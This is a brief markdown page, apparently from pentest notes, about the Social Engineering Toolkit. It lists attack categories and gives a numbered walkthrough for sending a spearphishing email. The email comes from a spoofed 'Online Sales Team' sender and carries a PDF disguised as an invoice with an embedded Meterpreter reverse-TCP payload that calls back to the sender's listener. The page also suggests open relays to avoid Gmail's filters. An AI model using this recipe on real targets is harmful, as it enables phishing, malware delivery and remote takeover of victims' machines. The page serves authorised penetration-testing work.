---
title: Social Engineering Toolkit
layout: default
---

# Social Engineering Toolkit
Open source penetration testing framework designed for social engineering.
Encompasses built-in attacks which are designed to be focused on a person or organization.

Detailed information [here](https://github.com/trustedsec/social-engineer-toolkit).

Social Engineering Toolkit covers:
- Spearphishing Attacks
- Website Attacks
- Infectious Media Attacks
- Wireless AP Attacks
- Powershell Attacks
- ...and more

# Techniques covered
- Technical Information Gathering
    - T1249 Conduct Social Engineering
    - T1397 Spearphishing for information
- People Information Gathering
    - T1268 Conduct Social Engineering

# Basic Usage
SET runs in interactive mode.

Google puts in a lot of effort to prevent phishing emails.
Setup your own server of relay server to send payload in email.

## Example: Spearphishing with PDF embedded exe
1. Spear-Phishing Attack Vectors
2. Create a FileFormat Payload
3. Adobe PDF Embedded EXE Social Engineering 
4. Use built-in BLANK PDF for attack
5. Windows Meterpreter Reverse_TCP(x64)
6. Host: external IP for your PC/listener
7. Port: default 443
8. Rename the file, I want to be cool.
9. New filename:Invoice.pdf
10. E-Mail Attack Single Email Address
11. Pre-Defined Template
12. Order Confirmation
13. Send email to:target@eyepaste.com
14. Use your own server or open relay
15. From address: abc@my-server.com
16. The FROM NAME user will see: Online Sales Team
17. Username for open-relay [blank]: <your-mail-server>
18. Password for open-relay [<your-mail-server>]: <your-mail-server-password>
19. SMTP email server address: <your-smtp-email-server-address>
20. Port number for SMTP server [25]: 587
21. Flag this message as high priority? [yes/no]: yes
22. Does your server support TLS? [yes/no]: no
23. Setup a listener [yes/no]:yes
24. This will start a metasploit session with listener
25. Now you have to wait for target to open set playload(pdf in this case)

